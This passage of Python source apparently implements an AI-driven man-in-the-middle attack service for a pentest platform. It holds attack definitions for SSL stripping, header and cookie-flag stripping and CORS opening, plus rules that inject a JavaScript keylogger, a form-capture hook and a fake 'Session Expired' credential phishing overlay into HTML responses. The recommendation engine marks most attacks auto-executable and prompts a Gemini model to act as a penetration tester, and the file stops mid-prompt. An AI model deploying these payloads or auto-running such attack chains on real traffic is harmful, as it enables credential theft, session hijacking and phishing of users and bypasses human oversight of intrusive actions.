"""
MITM Attack Tools Service

Provides integration of security testing tools with AI-powered recommendations
and agentic execution that automatically adds findings to reports.

Supported Tools:
- SSLStrip: Strip SSL/TLS to capture credentials
- Bettercap: Advanced MITM toolkit
- mitmproxy: Scriptable proxy
- ARP Spoofing: Network-level MITM
- DNS Spoofing: DNS-based interception
- Cookie Manipulation: Session hijacking
- Header Injection: Security header attacks
- Request Smuggling: HTTP desync attacks
"""

import asyncio
import json
import logging
import re
import time
import uuid
from dataclasses import dataclass, field, asdict
from datetime import datetime
from enum import Enum
from typing import Any, Dict, List, Optional, Callable, Tuple

# Import new agentic components (mitm_attack_tools_extended imported later to avoid circular import)
from .mitm_agentic_brain import (
    MITMAgentMemory,
    MITMChainOfThoughtReasoner,
    MITMExplorationManager,
    MITMMemoryEntry,
)

# Import WebSocket manager for real-time progress updates
from ..core.mitm_ws_manager import mitm_stream_manager
from .mitm_attack_phases import (
    MITMPhaseController,
    AttackPhase,
    PHASE_DEFINITIONS,
)
from .mitm_attack_chains import (
    MITMChainExecutor,
    ATTACK_CHAINS,
    ChainTrigger,
)
from .mitm_mitre_mapping import MITMNarrativeGenerator, TOOL_MITRE_MAPPING
from .mitm_external_tools import ExternalToolManager

logger = logging.getLogger(__name__)


# ============================================================================
# Attack Tool Definitions
# ============================================================================

class ToolCategory(str, Enum):
    """Categories of MITM attack tools"""
    SSL_STRIPPING = "ssl_stripping"
    NETWORK_INTERCEPTION = "network_interception"
    CREDENTIAL_HARVESTING = "credential_harvesting"
    SESSION_HIJACKING = "session_hijacking"
    HEADER_MANIPULATION = "header_manipulation"
    CONTENT_INJECTION = "content_injection"
    PROTOCOL_ATTACK = "protocol_attack"
    RECONNAISSANCE = "reconnaissance"


class ToolRiskLevel(str, Enum):
    """Risk level of running the tool"""
    LOW = "low"  # Passive observation
    MEDIUM = "medium"  # Header manipulation
    HIGH = "high"  # Active interception
    CRITICAL = "critical"  # Credential capture, active exploit


@dataclass
class MITMAttackTool:
    """Definition of an MITM attack tool"""
    id: str
    name: str
    description: str
    category: ToolCategory
    risk_level: ToolRiskLevel
    
    # When to recommend this tool
    triggers: List[str] = field(default_factory=list)  # Findings/conditions that trigger
    prerequisites: List[str] = field(default_factory=list)  # Required conditions
    
    # How to execute
    execution_type: str = "builtin"  # builtin, external, rule
    rule_template: Optional[Dict] = None  # For rule-based execution
    command_template: Optional[str] = None  # For external tools
    
    # What it does
    capabilities: List[str] = field(default_factory=list)
    expected_findings: List[str] = field(default_factory=list)
    
    # Documentation
    documentation_url: Optional[str] = None
    poc_examples: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d['category'] = self.category.value
        d['risk_level'] = self.risk_level.value
        return d


@dataclass
class ToolExecutionResult:
    """Result of executing an attack tool"""
    tool_id: str
    success: bool
    execution_time_ms: float
    findings: List[Dict] = field(default_factory=list)
    traffic_captured: List[Dict] = field(default_factory=list)
    credentials_found: List[Dict] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    recommendations: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        result = {
            "tool_id": self.tool_id,
            "success": self.success,
            "execution_time": self.execution_time_ms / 1000,  # Convert to seconds
            "findings": self.findings,
            "rules_applied": 1 if self.success else 0,
            "errors": self.errors,
            "summary": f"Executed {self.tool_id}: {'success' if self.success else 'failed'}. "
                       f"Found {len(self.findings)} findings."
        }
        
        # Include captured data if available
        if self.credentials_found:
            result["captured_data"] = {
                "credentials": [
                    {"username": c.get("username", ""), 
                     "password": c.get("password", ""), 
                     "source": c.get("endpoint", "unknown")}
                    for c in self.credentials_found
                ],
                "tokens": [],
                "cookies": []
            }
        
        return result


@dataclass
class AIToolRecommendation:
    """AI-generated tool recommendation"""
    tool_id: str
    tool_name: str
    confidence: float  # 0.0 - 1.0
    reason: str
    based_on_findings: List[str]
    expected_impact: str
    execution_steps: List[str]
    auto_executable: bool
    risk_warning: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


# ============================================================================
# Built-in Attack Tools Registry
# ============================================================================

MITM_ATTACK_TOOLS: Dict[str, MITMAttackTool] = {
    # SSL Stripping Attacks
    "sslstrip": MITMAttackTool(
        id="sslstrip",
        name="SSL Strip Attack",
        description="Downgrades HTTPS connections to HTTP by rewriting secure links and stripping SSL/TLS. "
                    "Captures credentials transmitted over the downgraded connection.",
        category=ToolCategory.SSL_STRIPPING,
        risk_level=ToolRiskLevel.CRITICAL,
        triggers=["missing_hsts", "no_hsts_header", "http_links_in_https"],
        prerequisites=["proxy_running", "target_uses_https"],
        execution_type="builtin",
        rule_template={
            "name": "SSL Strip - HTTPS to HTTP Downgrade",
            "match_direction": "response",
            "match_content_type": "text/html",  # Only modify HTML to avoid corrupting JS/CSS
            "action": "modify",
            "body_find_replace": {
                "https://": "http://",
                'href="https://': 'href="http://',
                'src="https://': 'src="http://',
                'action="https://': 'action="http://'
            },
            "remove_headers": ["Strict-Transport-Security"]
        },
        capabilities=[
            "Rewrite HTTPS links to HTTP in responses",
            "Remove HSTS headers to prevent browser enforcement",
            "Capture form submissions over downgraded HTTP",
            "Strip secure cookie flags"
        ],
        expected_findings=[
            "Credentials captured over HTTP",
            "Session tokens intercepted",
            "API keys exposed in cleartext"
        ],
        documentation_url="https://www.moxie.org/software/sslstrip/",
        poc_examples=[
            "# Original: <a href='https://bank.com/login'>Login</a>",
            "# Modified: <a href='http://bank.com/login'>Login</a>",
            "# Form action rewritten, credentials sent in cleartext"
        ]
    ),
    
    "hsts_bypass": MITMAttackTool(
        id="hsts_bypass",
        name="HSTS Preload Bypass",
        description="Attempts to bypass HSTS by removing the header before browser caches it, "
                    "or by using homograph domains.",
        category=ToolCategory.SSL_STRIPPING,
        risk_level=ToolRiskLevel.HIGH,
        triggers=["hsts_header_present", "hsts_short_max_age"],
        prerequisites=["proxy_running"],
        execution_type="builtin",
        rule_template={
            "name": "HSTS Bypass - Remove Header",
            "match_direction": "response",
            "action": "modify",
            "remove_headers": [
                "Strict-Transport-Security",
                "Public-Key-Pins",
                "Public-Key-Pins-Report-Only"
            ]
        },
        capabilities=[
            "Remove HSTS header from first response",
            "Prevent browser from caching HSTS policy",
            "Detect HSTS preload status"
        ],
        expected_findings=[
            "HSTS can be stripped on first visit",
            "Short HSTS max-age allows periodic attacks"
        ]
    ),
    
    # Credential Harvesting
    "credential_sniffer": MITMAttackTool(
        id="credential_sniffer",
        name="Credential Sniffer",
        description="Monitors traffic for credentials, API keys, tokens, and other sensitive authentication data.",
        category=ToolCategory.CREDENTIAL_HARVESTING,
        risk_level=ToolRiskLevel.LOW,  # Passive observation only - doesn't modify traffic
        triggers=["http_basic_auth", "form_with_password", "api_key_in_header"],
        prerequisites=["proxy_running", "traffic_flowing"],
        execution_type="builtin",
        capabilities=[
            "Detect Basic/Bearer/API Key auth headers",
            "Extract form-submitted credentials",
            "Identify JWT tokens and decode them",
            "Flag hardcoded secrets in requests"
        ],
        expected_findings=[
            "Credentials transmitted in cleartext",
            "API keys exposed in headers",
            "JWT tokens with weak signing"
        ]
    ),
    
    "cookie_hijacker": MITMAttackTool(
        id="cookie_hijacker",
        name="Session Cookie Hijacker",
        description="Captures and analyzes session cookies for hijacking opportunities. "
                    "Identifies cookies missing security flags.",
        category=ToolCategory.SESSION_HIJACKING,
        risk_level=ToolRiskLevel.HIGH,
        triggers=["cookie_no_httponly", "cookie_no_secure", "cookie_no_samesite"],
        prerequisites=["proxy_running"],
        execution_type="builtin",
        rule_template={
            "name": "Cookie Flag Stripper",
            "match_direction": "response",
            "action": "modify",
            "body_find_replace_regex": True,
            "body_find_replace": {
                "; ?HttpOnly": "",
                "; ?Secure": "",
                "; ?SameSite=\\w+": ""
            }
        },
        capabilities=[
            "Capture session cookies",
            "Strip HttpOnly flag for XSS exploitation",
            "Remove Secure flag for HTTP transmission",
            "Remove SameSite for CSRF attacks"
        ],
        expected_findings=[
            "Session can be hijacked via XSS",
            "Cookie accessible over HTTP",
            "CSRF protection bypassed"
        ]
    ),
    
    # Header Manipulation
    "csp_bypass": MITMAttackTool(
        id="csp_bypass",
        name="CSP Bypass/Stripper",
        description="Removes or weakens Content-Security-Policy headers to enable XSS attacks.",
        category=ToolCategory.HEADER_MANIPULATION,
        risk_level=ToolRiskLevel.MEDIUM,
        triggers=["csp_header_present", "strict_csp"],
        prerequisites=["proxy_running"],
        execution_type="builtin",
        rule_template={
            "name": "CSP Stripper",
            "match_direction": "response",
            "action": "modify",
            "remove_headers": [
                "Content-Security-Policy",
                "Content-Security-Policy-Report-Only",
                "X-Content-Security-Policy",
                "X-WebKit-CSP"
            ]
        },
        capabilities=[
            "Remove CSP headers completely",
            "Enable inline script execution",
            "Allow external script loading",
            "Facilitate XSS exploitation"
        ],
        expected_findings=[
            "XSS protection removed",
            "Inline scripts now executable",
            "External resources loadable"
        ]
    ),
    
    "cors_manipulator": MITMAttackTool(
        id="cors_manipulator",
        name="CORS Policy Manipulator",
        description="Modifies CORS headers to enable cross-origin attacks and data theft.",
        category=ToolCategory.HEADER_MANIPULATION,
        risk_level=ToolRiskLevel.MEDIUM,
        triggers=["cors_misconfigured", "cors_reflects_origin"],
        prerequisites=["proxy_running"],
        execution_type="builtin",
        rule_template={
            "name": "CORS Opener",
            "match_direction": "response",
            "action": "modify",
            "modify_headers": {
                "Access-Control-Allow-Origin": "*",
                "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS, PATCH",
                "Access-Control-Allow-Headers": "*",
                "Access-Control-Allow-Credentials": "true",
                "Access-Control-Max-Age": "86400"
            }
        },
        capabilities=[
            "Open CORS policy completely",
            "Allow cross-origin credential requests",
            "Enable data theft from other origins"
        ],
        expected_findings=[
            "Cross-origin data theft possible",
            "Authenticated requests from any origin",
            "API accessible from attacker site"
        ]
    ),
    
    "x_frame_bypass": MITMAttackTool(
        id="x_frame_bypass",
        name="Clickjacking Enabler",
        description="Removes X-Frame-Options and frame-ancestors CSP to enable clickjacking attacks.",
        category=ToolCategory.HEADER_MANIPULATION,
        risk_level=ToolRiskLevel.MEDIUM,
        triggers=["x_frame_options_present", "frame_ancestors_csp"],
        prerequisites=["proxy_running"],
        execution_type="builtin",
        rule_template={
            "name": "Clickjacking Enabler",
            "match_direction": "response",
            "match_content_type": "text/html",  # CSP meta tags only in HTML
            "action": "modify",
            "remove_headers": ["X-Frame-Options"],
            "body_find_replace": {
                "frame-ancestors 'self'": "frame-ancestors *",
                "frame-ancestors 'none'": "frame-ancestors *"
            }
        },
        capabilities=[
            "Remove clickjacking protection",
            "Enable iframe embedding",
            "Facilitate UI redressing attacks"
        ],
        expected_findings=[
            "Page can be framed by attacker",
            "Clickjacking attack possible"
        ]
    ),
    
    # Content Injection
    "script_injector": MITMAttackTool(
        id="script_injector",
        name="JavaScript Injector",
        description="Injects JavaScript into HTML responses for keylogging, cookie theft, or phishing.",
        category=ToolCategory.CONTENT_INJECTION,
        risk_level=ToolRiskLevel.CRITICAL,
        triggers=["html_response", "missing_csp", "weak_csp"],
        prerequisites=["proxy_running", "auto_modify_mode"],
        execution_type="builtin",
        rule_template={
            "name": "JS Keylogger Injector",
            "match_direction": "response",
            "match_content_type": "text/html",
            "action": "modify",
            "body_find_replace": {
                "</body>": """<script>
// MITM Injected - Keylogger Demo
(function(){
  var log = [];
  document.addEventListener('keypress', function(e) {
    log.push({key: e.key, time: Date.now(), field: e.target.name || e.target.id});
    if(log.length >= 10) {
      console.log('[MITM Captured Keys]:', JSON.stringify(log));
      log = [];
    }
  });
  document.addEventListener('submit', function(e) {
    var form = e.target;
    var data = new FormData(form);
    console.log('[MITM Form Capture]:', Object.fromEntries(data));
  });
})();
</script></body>"""
            }
        },
        capabilities=[
            "Inject keylogger to capture all keystrokes",
            "Hook form submissions to capture credentials",
            "Insert phishing content",
            "Redirect sensitive actions"
        ],
        expected_findings=[
            "Keystrokes captured successfully",
            "Form data intercepted",
            "Credentials harvested via injection"
        ]
    ),
    
    "phishing_injector": MITMAttackTool(
        id="phishing_injector",
        name="Phishing Content Injector",
        description="Injects fake login forms or misleading content for credential phishing.",
        category=ToolCategory.CONTENT_INJECTION,
        risk_level=ToolRiskLevel.CRITICAL,
        triggers=["html_response", "login_page_detected"],
        prerequisites=["proxy_running", "auto_modify_mode"],
        execution_type="builtin",
        rule_template={
            "name": "Fake Session Expired Popup",
            "match_direction": "response",
            "match_content_type": "text/html",
            "action": "modify",
            "body_find_replace": {
                "</body>": """<div id="mitm-phish" style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);z-index:99999;display:flex;align-items:center;justify-content:center;">
<div style="background:white;padding:30px;border-radius:8px;max-width:400px;text-align:center;">
  <h2 style="color:#333;margin-bottom:20px;">Session Expired</h2>
  <p style="color:#666;margin-bottom:20px;">Please re-enter your credentials to continue</p>
  <form id="mitm-creds" onsubmit="console.log('[MITM PHISH]',{u:this.u.value,p:this.p.value});this.style.display='none';document.getElementById('mitm-phish').remove();return false;">
    <input name="u" type="text" placeholder="Username" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ddd;border-radius:4px;">
    <input name="p" type="password" placeholder="Password" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ddd;border-radius:4px;">
    <button type="submit" style="width:100%;padding:12px;background:#007bff;color:white;border:none;border-radius:4px;cursor:pointer;">Sign In</button>
  </form>
</div>
</div></body>"""
            }
        },
        capabilities=[
            "Inject convincing phishing forms",
            "Overlay fake login prompts",
            "Capture credentials via social engineering"
        ],
        expected_findings=[
            "Phishing attack successful",
            "User credentials captured"
        ]
    ),
    
    # Protocol Attacks
    "response_smuggling": MITMAttackTool(
        id="response_smuggling",
        name="HTTP Response Smuggling",
        description="Manipulates Content-Length and Transfer-Encoding to smuggle malicious responses.",
        category=ToolCategory.PROTOCOL_ATTACK,
        risk_level=ToolRiskLevel.HIGH,
        triggers=["http_1_1_connection", "chunked_transfer"],
        prerequisites=["proxy_running"],
        execution_type="builtin",
        rule_template={
            "name": "Smuggled Response Injection",
            "match_direction": "response",
            "action": "modify",
            "modify_headers": {
                "Transfer-Encoding": "chunked"
            }
        },
        capabilities=[
            "Inject smuggled HTTP responses",
            "Cache poisoning via smuggling",
            "Bypass security controls"
        ],
        expected_findings=[
            "Response smuggling possible",
            "Cache poisoning demonstrated"
        ]
    ),
    
    "slow_loris": MITMAttackTool(
        id="slow_loris",
        name="Slow Response Tester",
        description="Tests application resilience by introducing artificial delays to responses.",
        category=ToolCategory.PROTOCOL_ATTACK,
        risk_level=ToolRiskLevel.MEDIUM,  # Modifies response timing - not passive
        triggers=["any_traffic"],
        prerequisites=["proxy_running"],
        execution_type="builtin",
        rule_template={
            "name": "Slow Response (5s)",
            "match_direction": "response",
            "action": "delay",
            "delay_ms": 5000
        },
        capabilities=[
            "Test timeout handling",
            "Identify race conditions",
            "Stress test retry logic"
        ],
        expected_findings=[
            "Application timeout behavior analyzed",
            "Race condition window identified"
        ]
    ),
    
    # Reconnaissance
    "header_analyzer": MITMAttackTool(
        id="header_analyzer",
        name="Security Header Analyzer",
        description="Analyzes all security headers and identifies missing or weak configurations.",
        category=ToolCategory.RECONNAISSANCE,
        risk_level=ToolRiskLevel.LOW,
        triggers=["any_traffic"],
        prerequisites=["proxy_running", "traffic_captured"],
        execution_type="builtin",
        capabilities=[
            "Identify missing security headers",
            "Rate header configurations",
            "Suggest improvements"
        ],
        expected_findings=[
            "Security header assessment complete",
            "Missing headers identified",
            "Weak configurations flagged"
        ]
    ),
    
    "tech_fingerprint": MITMAttackTool(
        id="tech_fingerprint",
        name="Technology Fingerprinter",
        description="Identifies server technologies, frameworks, and versions from headers and responses.",
        category=ToolCategory.RECONNAISSANCE,
        risk_level=ToolRiskLevel.LOW,
        triggers=["any_traffic"],
        prerequisites=["proxy_running", "traffic_captured"],
        execution_type="builtin",
        capabilities=[
            "Extract Server header",
            "Identify X-Powered-By",
            "Detect framework signatures",
            "Version enumeration"
        ],
        expected_findings=[
            "Server technology identified",
            "Framework version detected",
            "Known vulnerable version found"
        ]
    ),

    # =========================================================================
    # Passive Analysis Tools (LOW risk - no traffic modification)
    # =========================================================================

    "traffic_analyzer": MITMAttackTool(
        id="traffic_analyzer",
        name="Traffic Pattern Analyzer",
        description="Analyzes traffic patterns to identify API endpoints, authentication flows, "
                    "and sensitive data paths without modifying any traffic.",
        category=ToolCategory.RECONNAISSANCE,
        risk_level=ToolRiskLevel.LOW,
        triggers=["any_traffic"],
        prerequisites=["proxy_running", "traffic_captured"],
        execution_type="builtin",
        capabilities=[
            "Map API endpoints and methods",
            "Identify authentication patterns",
            "Detect sensitive data flows",
            "Analyze request/response patterns"
        ],
        expected_findings=[
            "API endpoints mapped",
            "Authentication flow identified",
            "Sensitive endpoints discovered"
        ]
    ),

    "cookie_analyzer": MITMAttackTool(
        id="cookie_analyzer",
        name="Cookie Security Analyzer",
        description="Passively analyzes cookies for security flag issues without modifying traffic.",
        category=ToolCategory.RECONNAISSANCE,
        risk_level=ToolRiskLevel.LOW,
        triggers=["cookies_detected", "set_cookie_header"],
        prerequisites=["proxy_running"],
        execution_type="builtin",
        capabilities=[
            "Identify missing HttpOnly flags",
            "Detect missing Secure flags",
            "Check SameSite attributes",
            "Analyze cookie scope and expiry"
        ],
        expected_findings=[
            "Cookies missing security flags",
            "Session cookies without HttpOnly",
            "Cookies sent over HTTP"
        ]
    ),

    "auth_flow_analyzer": MITMAttackTool(
        id="auth_flow_analyzer",
        name="Authentication Flow Analyzer",
        description="Passively analyzes authentication mechanisms including OAuth, JWT, sessions.",
        category=ToolCategory.RECONNAISSANCE,
        risk_level=ToolRiskLevel.LOW,
        triggers=["auth_header_detected", "login_page_detected", "oauth_flow"],
        prerequisites=["proxy_running", "traffic_captured"],
        execution_type="builtin",
        capabilities=[
            "Identify auth mechanisms (Basic, Bearer, JWT, OAuth)",
            "Analyze token structures",
            "Map login and logout flows",
            "Detect session management patterns"
        ],
        expected_findings=[
            "Authentication mechanism identified",
            "JWT algorithm detected",
            "OAuth flow mapped"
        ]
    ),

    "sensitive_data_scanner": MITMAttackTool(
        id="sensitive_data_scanner",
        name="Sensitive Data Scanner",
        description="Scans traffic for PII, secrets, API keys, and other sensitive data patterns.",
        category=ToolCategory.RECONNAISSANCE,
        risk_level=ToolRiskLevel.LOW,
        triggers=["any_traffic"],
        prerequisites=["proxy_running", "traffic_captured"],
        execution_type="builtin",
        capabilities=[
            "Detect PII (emails, SSNs, credit cards)",
            "Find API keys and secrets",
            "Identify hardcoded credentials",
            "Scan for sensitive file paths"
        ],
        expected_findings=[
            "Sensitive data in responses",
            "API keys exposed",
            "PII transmitted"
        ]
    ),
}


# ============================================================================
# AI Tool Recommendation Engine
# ============================================================================

class MITMToolRecommendationEngine:
    """AI-powered engine to recommend attack tools based on traffic analysis"""
    
    def __init__(self):
        self.tools = MITM_ATTACK_TOOLS
    
    async def analyze_and_recommend(
        self,
        traffic_log: List[Dict],
        existing_findings: List[Dict],
        proxy_config: Dict
    ) -> List[AIToolRecommendation]:
        """
        Analyze traffic and existing findings to recommend attack tools.
        
        Uses both pattern matching and AI for intelligent recommendations.
        """
        recommendations = []
        
        # Extract relevant data from traffic
        context = self._extract_context(traffic_log, existing_findings, proxy_config)
        
        # Pattern-based recommendations (fast)
        pattern_recs = self._pattern_based_recommendations(context)
        recommendations.extend(pattern_recs)
        
        # AI-powered recommendations (if available)
        ai_recs = await self._ai_recommendations(context, pattern_recs)
        
        # Merge and dedupe
        final_recs = self._merge_recommendations(pattern_recs, ai_recs)
        
        # Sort by confidence
        final_recs.sort(key=lambda r: r.confidence, reverse=True)
        
        return final_recs[:10]  # Top 10 recommendations
    
    def _extract_context(
        self,
        traffic_log: List[Dict],
        findings: List[Dict],
        proxy_config: Dict
    ) -> Dict:
        """Extract context for recommendation analysis with feedback support"""
        context = {
            "has_https": proxy_config.get("tls_enabled", False),
            "target_host": proxy_config.get("target_host", ""),
            "target_port": proxy_config.get("target_port", 80),
            "finding_categories": set(),
            "finding_titles": [],
            "detected_headers": set(),
            "missing_headers": set(),
            "has_cookies": False,
            "cookie_issues": [],
            "cookie_flags_missing": set(),
            "has_forms": False,
            "has_auth": False,
            "auth_type": None,
            "content_types": set(),
            "technologies": set(),
            "traffic_count": len(traffic_log),
            "sensitive_endpoints": [],
            # Feedback loop: include previous findings for re-evaluation
            "previous_findings": findings if findings else []
        }
        
        # Analyze findings (these may be from previous tool executions - feedback loop)
        for f in findings:
            cat = f.get("category", "").lower()
            title = f.get("title", "").lower()
            context["finding_categories"].add(cat)
            context["finding_titles"].append(title)
            
            if "cookie" in cat or "cookie" in title:
                context["cookie_issues"].append(f)
            if "hsts" in cat or "hsts" in title:
                context["missing_headers"].add("hsts")
            if "csp" in cat or "csp" in title:
                context["missing_headers"].add("csp")
            if "cors" in cat or "cors" in title:
                context["missing_headers"].add("cors")
            if "x-frame" in cat or "x-frame" in title:
                context["missing_headers"].add("x-frame-options")
        
        # Analyze traffic for comprehensive context
        security_headers_checklist = {
            "strict-transport-security", "content-security-policy",
            "x-content-type-options", "x-frame-options", "x-xss-protection",
            "referrer-policy", "permissions-policy"
        }
        seen_response_headers = set()
        
        for entry in traffic_log[:50]:  # Sample
            if not isinstance(entry, dict):
                continue
            req = entry.get("request") or {}
            resp = entry.get("response") or {}
            
            req_headers = req.get("headers") or {}
            resp_headers = resp.get("headers") or {}
            path = req.get("path") or ""
            
            # Check auth
            if "Authorization" in req_headers:
                context["has_auth"] = True
                auth = req_headers["Authorization"]
                if auth.startswith("Basic"):
                    context["auth_type"] = "basic"
                elif auth.startswith("Bearer"):
                    context["auth_type"] = "bearer"
                elif "apikey" in auth.lower():
                    context["auth_type"] = "api_key"
            
            # Check cookies with flag analysis
            if "Cookie" in req_headers or "Set-Cookie" in resp_headers:
                context["has_cookies"] = True
                set_cookie = resp_headers.get("Set-Cookie", "")
                if set_cookie:
                    if "httponly" not in set_cookie.lower():
                        context["cookie_flags_missing"].add("HttpOnly")
                    if "secure" not in set_cookie.lower():
                        context["cookie_flags_missing"].add("Secure")
                    if "samesite" not in set_cookie.lower():
                        context["cookie_flags_missing"].add("SameSite")
            
            # Track response headers for security header analysis
            for h in resp_headers.keys():
                seen_response_headers.add(h.lower())
            
            # Content types
            ct = resp_headers.get("Content-Type", "")
            if ct:
                context["content_types"].add(ct.split(";")[0])
            
            # Technologies
            if "Server" in resp_headers:
                context["technologies"].add(f"Server: {resp_headers['Server']}")
            if "X-Powered-By" in resp_headers:
                context["technologies"].add(f"Framework: {resp_headers['X-Powered-By']}")
            
            # Detect sensitive endpoints
            if any(p in path.lower() for p in ["login", "auth", "signin", "password", "register", "admin", "api/user"]):
                context["sensitive_endpoints"].append(path)
            
            # Forms
            body = resp.get("body_text", "")
            if body and ("<form" in body.lower() or "type=\"password\"" in body.lower()):
                context["has_forms"] = True
        
        # Calculate missing security headers from actual response headers
        for sh in security_headers_checklist:
            if sh not in seen_response_headers:
                # Map to our naming
                if sh == "strict-transport-security":
                    context["missing_headers"].add("hsts")
                elif sh == "content-security-policy":
                    context["missing_headers"].add("csp")
                else:
                    context["missing_headers"].add(sh)
        
        return context
    
    def _pattern_based_recommendations(self, context: Dict) -> List[AIToolRecommendation]:
        """Generate recommendations based on pattern matching"""
        recommendations = []
        
        # SSL Strip if no HSTS
        if "hsts" in context["missing_headers"] and context["has_https"]:
            recommendations.append(AIToolRecommendation(
                tool_id="sslstrip",
                tool_name="SSL Strip Attack",
                confidence=0.9,
                reason="Missing HSTS header allows SSL stripping attacks. Attacker can intercept initial HTTP request and downgrade the connection.",
                based_on_findings=["Missing HSTS header"],
                expected_impact="Capture credentials and session tokens transmitted over downgraded HTTP connection",
                execution_steps=[
                    "Apply SSL strip rule to rewrite HTTPS links to HTTP",
                    "Remove HSTS header from responses",
                    "Monitor traffic for captured credentials",
                    "Document successful interceptions"
                ],
                auto_executable=True,
                risk_warning="This actively modifies traffic and captures credentials"
            ))
        
        # CSP Bypass if CSP is present or missing allows XSS
        if "csp" in context["missing_headers"] or "missing_csp" in context["finding_categories"]:
            recommendations.append(AIToolRecommendation(
                tool_id="csp_bypass",
                tool_name="CSP Bypass/Stripper",
                confidence=0.85,
                reason="Missing or weak CSP allows script injection attacks. Removing CSP enables XSS exploitation.",
                based_on_findings=["Missing/weak Content-Security-Policy"],
                expected_impact="Enable XSS attacks, inject malicious scripts, steal data",
                execution_steps=[
                    "Apply CSP stripper rule to remove all CSP headers",
                    "Test XSS payloads in identified injection points",
                    "Attempt to exfiltrate data via injected scripts"
                ],
                auto_executable=True
            ))
        
        # Cookie hijacking if cookie issues
        if context["cookie_issues"] or context["has_cookies"]:
            findings = [f.get("title", "Cookie issue") for f in context["cookie_issues"][:3]]
            recommendations.append(AIToolRecommendation(
                tool_id="cookie_hijacker",
                tool_name="Session Cookie Hijacker",
                confidence=0.8,
                reason="Cookies detected with missing security flags. Session hijacking may be possible.",
                based_on_findings=findings or ["Cookies detected in traffic"],
                expected_impact="Steal session cookies, hijack user accounts, bypass authentication",
                execution_steps=[
                    "Capture all cookies from traffic",
                    "Identify session cookies by name/value patterns",
                    "Apply cookie flag stripper if needed",
                    "Document captured session tokens"
                ],
                auto_executable=True
            ))
        
        # Script injection if forms present and CSP weak
        if context["has_forms"] and "csp" in context["missing_headers"]:
            recommendations.append(AIToolRecommendation(
                tool_id="script_injector",
                tool_name="JavaScript Injector",
                confidence=0.85,
                reason="Login forms detected with weak CSP. Script injection can capture credentials.",
                based_on_findings=["Forms with password fields", "Missing CSP"],
                expected_impact="Capture all keystrokes and form submissions including credentials",
                execution_steps=[
                    "Inject keylogger script into HTML responses",
                    "Hook form submission events",
                    "Capture and log all entered credentials",
                    "Document successful credential capture"
                ],
                auto_executable=True,
                risk_warning="Captures all user input including credentials"
            ))
        
        # CORS manipulation if CORS issues
        if "cors" in context["missing_headers"] or any("cors" in t for t in context["finding_titles"]):
            recommendations.append(AIToolRecommendation(
                tool_id="cors_manipulator",
                tool_name="CORS Policy Manipulator",
                confidence=0.75,
                reason="CORS misconfiguration detected. Cross-origin data theft may be possible.",
                based_on_findings=["CORS misconfiguration"],
                expected_impact="Enable cross-origin requests to steal authenticated data",
                execution_steps=[
                    "Apply permissive CORS headers to responses",
                    "Test cross-origin data access from attacker domain",
                    "Document accessible endpoints and data"
                ],
                auto_executable=True
            ))
        
        # Clickjacking if X-Frame missing
        if "x-frame-options" in context["missing_headers"]:
            recommendations.append(AIToolRecommendation(
                tool_id="x_frame_bypass",
                tool_name="Clickjacking Enabler",
                confidence=0.7,
                reason="Missing X-Frame-Options allows the page to be framed by attackers.",
                based_on_findings=["Missing X-Frame-Options"],
                expected_impact="Enable clickjacking attacks to trick users into unintended actions",
                execution_steps=[
                    "Confirm page can be embedded in iframe",
                    "Create PoC clickjacking page",
                    "Document vulnerable actions"
                ],
                auto_executable=True
            ))
        
        # Always recommend recon tools
        if context["traffic_count"] > 0:
            recommendations.append(AIToolRecommendation(
                tool_id="header_analyzer",
                tool_name="Security Header Analyzer",
                confidence=0.6,
                reason="Traffic captured - security header analysis can identify additional issues.",
                based_on_findings=["Traffic available for analysis"],
                expected_impact="Comprehensive security header assessment",
                execution_steps=[
                    "Analyze all response headers",
                    "Identify missing security headers",
                    "Rate configuration strength"
                ],
                auto_executable=True
            ))
            
            recommendations.append(AIToolRecommendation(
                tool_id="tech_fingerprint",
                tool_name="Technology Fingerprinter",
                confidence=0.5,
                reason="Identifying server technologies helps find version-specific vulnerabilities.",
                based_on_findings=["Traffic available for analysis"],
                expected_impact="Identify technologies and potential CVEs",
                execution_steps=[
                    "Extract technology signatures",
                    "Lookup known vulnerabilities",
                    "Document findings"
                ],
                auto_executable=True
            ))
        
        # Credential sniffer if auth detected
        if context["has_auth"]:
            recommendations.append(AIToolRecommendation(
                tool_id="credential_sniffer",
                tool_name="Credential Sniffer",
                confidence=0.85,
                reason=f"Authentication detected ({context['auth_type'] or 'unknown type'}). Monitoring for credential exposure.",
                based_on_findings=["Authentication headers detected"],
                expected_impact="Capture authentication credentials and tokens",
                execution_steps=[
                    "Monitor Authorization headers",
                    "Decode Basic auth credentials",
                    "Analyze JWT tokens",
                    "Document captured credentials"
                ],
                auto_executable=True,
                risk_warning="Captures authentication credentials"
            ))
        
        return recommendations
    
    async def _ai_recommendations(
        self,
        context: Dict,
        existing_recs: List[AIToolRecommendation]
    ) -> List[AIToolRecommendation]:
        """Generate AI-powered recommendations using Gemini with enhanced context"""
        try:
            from ..core.config import settings
            
            if not settings.gemini_api_key:
                return []
            
            from google import genai
            from google.genai import types
            
            client = genai.Client(api_key=settings.gemini_api_key)
            
            # Build context summary
            existing_tool_ids = [r.tool_id for r in existing_recs]
            available_tools = [
                {"id": t.id, "name": t.name, "desc": t.description[:100], "triggers": t.triggers[:3]}
                for t in self.tools.values()
                if t.id not in existing_tool_ids
            ]
            
            # Include previous findings for feedback loop
            previous_findings = context.get("previous_findings", [])
            finding_summary = ""
            if previous_findings:
                critical_high = [f for f in previous_findings if f.get("severity") in ["critical", "high"]]
                finding_summary = f"""
PREVIOUS FINDINGS (from earlier tool executions):
- Total: {len(previous_findings)}
- Critical/High: {len(critical_high)}
- Categories: {list(set(f.get('category', 'unknown') for f in previous_findings[:10]))}
- Key findings: {[f.get('title', '')[:50] for f in critical_high[:5]]}

IMPORTANT: Based on these findings, recommend tools that would:
1. Exploit discovered vulnerabilities further
2. Chain with existing findings (e.g., if credentials found, recommend session hijacking)
3. Validate or confirm suspected issues
"""

            prompt = f"""You are an expert penetration tester AI. Analyze the traffic context and previous findings to recommend attack tools.

TARGET CONTEXT:
